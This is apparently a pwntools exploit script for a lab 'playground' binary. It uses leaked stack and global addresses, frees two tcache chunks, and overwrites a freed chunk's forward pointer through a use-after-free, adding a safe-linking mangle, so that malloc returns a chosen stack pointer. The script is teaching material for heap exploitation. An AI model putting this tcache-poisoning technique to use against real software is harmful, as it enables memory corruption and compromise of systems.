#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def protect_ptr(heap_addr, ptr):
    return (heap_addr >> 12) ^ ptr


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    # first allocation
    p.clean()
    p.sendline(b"malloc 0x64")
    p.recvuntil(b"[*]")
    ptr1 = int(p.recvline()[:-1], 16)
    print(f"ptr1: {ptr1:#x}")

    # second allocation in same tcache bin
    p.clean()
    p.sendline(b"malloc 0x64")
    p.recvuntil(b"[*]")
    ptr2 = int(p.recvline()[:-1], 16)
    print(f"ptr2: {ptr2:#x}")

    # get the heap page where we're going to
    # write the fake fd pointer
    heap_page = ptr1 & ~0xfff
    print(f"heap page: {heap_page:#x}")

    p.sendline(f"free {ptr2:#x}".encode())
    p.sendline(f"free {ptr1:#x}".encode())

    # at this point tcache bin 0x70: ptr1 -> ptr2
    # let's perform UAF from alloc 0 to overwrite fd and
    p.sendline(f"write {ptr1:#x} 8".encode())
    p.sendline(pwn.p64(protect_ptr(heap_page, stack_ptr)))
    # now tcache bin 0x70: ptr1 -> malicious_ptr

    # getting the first entry in tcache bin, we don't care
    p.sendline(b"malloc 0x64")
    # now tcache bin 0x70: malicious_ptr

    # getting the forged next chunk, making malloc return an arbitrary pointer
    p.clean()
    p.sendline(b"malloc 0x64")
    p.recvuntil(b"[*]")
    malicious_ptr = int(p.recvline()[:-1], 16)
    print(f"malicious_ptr: {malicious_ptr:#x}")


def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)
    input("done")


if __name__ == "__main__":
    main()
